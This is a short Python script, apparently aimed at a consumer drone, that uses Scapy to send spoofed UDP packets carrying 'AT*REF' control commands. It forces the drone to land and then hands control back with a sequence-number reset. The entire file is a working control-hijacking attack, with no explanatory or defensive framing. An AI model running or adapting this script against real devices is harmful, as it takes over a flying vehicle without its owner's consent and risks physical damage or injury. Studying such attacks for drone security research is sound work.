from scapy.all import *
from time import sleep

srcIP = '192.168.1.2' # spoofed source IP address
dstIP = '192.168.1.1' # destination IP address
srcPort = 5556 # source port
dstPort = 5556 # destination port

#Land command: "AT*REF=1000000,290717696\r"

print "Sending spoofed land packets"

for i in range(1, 10):
	payload = "AT*REF=" + str(1000000+i) + ",290717696\r"
	print payload
	spoofed_packet = IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
	send(spoofed_packet)
	sleep(0.3)

print "Wait 5 seconds before restoring control"

sleep(5)

print "Send a spoofed packet with seq=1 to restore control"

payload = "AT*REF=1,290717696\r"
print payload
spoofed_packet = IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
send(spoofed_packet)
